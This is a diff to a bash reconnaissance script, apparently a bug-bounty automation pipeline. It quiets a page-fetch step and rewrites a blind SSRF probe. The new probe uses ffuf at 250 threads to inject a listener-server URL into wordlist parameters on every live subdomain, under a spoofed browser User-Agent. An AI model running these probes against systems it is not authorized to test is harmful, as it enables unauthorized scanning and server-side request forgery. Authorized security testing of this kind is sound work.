@@ -311,7 +311,7 @@ pagefetcher(){
     SCOPE=$1
     echo
     echo "[page-fetch] Fetch page's DOM..."
-    < $TARGETDIR/3-all-subdomain-live-scheme.txt page-fetch -o $TARGETDIR/page-fetched --no-third-party --exclude image/ --exclude css/
+    < $TARGETDIR/3-all-subdomain-live-scheme.txt page-fetch -o $TARGETDIR/page-fetched --no-third-party --exclude image/ --exclude css/ 1> /dev/null
     grep -horE  "https?[^\"\\'> ]+|www[.][^\"\\'> ]+" $TARGETDIR/page-fetched | grep "${SCOPE}" | sort | uniq | qsreplace -a > $TARGETDIR/page-fetched/pagefetcher_output.txt
 
     < $TARGETDIR/page-fetched/pagefetcher_output.txt unfurl --unique domains | grep "${SCOPE}" | sort | uniq | \
@@ -431,15 +431,16 @@ ssrftest(){
     echo
     echo "[SSRF-1] Headers..."
     ssrf-headers-tool $TARGETDIR/3-all-subdomain-live-scheme.txt $LISTENSERVER > /dev/null
-
     echo
+    # https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/burp-parameter-names.txt
     echo "[SSRF-2] Blind probe..."
-    # /?url=
-    ffuf -c -r -t 250 -u HOST/\?url=https://${LISTENSERVER}/DOMAIN \
-        -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
-        -w $TARGETDIR/3-all-subdomain-live-socket.txt:DOMAIN -mode pitchfork -debug-log $TARGETDIR/ffuf_debug.log
+    xargs -n1 -I {} ffuf -v -r -c -t 250 -u HOST/\?{}=https://${LISTENSERVER}/DOMAIN/{} \
+                         -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
+                         -w $TARGETDIR/3-all-subdomain-live-socket.txt:DOMAIN \
+                         -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36" \
+                         -mode pitchfork < wordlist/ssrf-params-list.txt
     echo "[SSRF-2] Blind probe done."
-
+    echo
     if [ -s "$customSsrfQueryList" ]; then
       # similar to paramspider but all wayback without limits
       echo "[SSRF-3] prepare ssrf-list: concat path out from gf ssrf with listen server..."
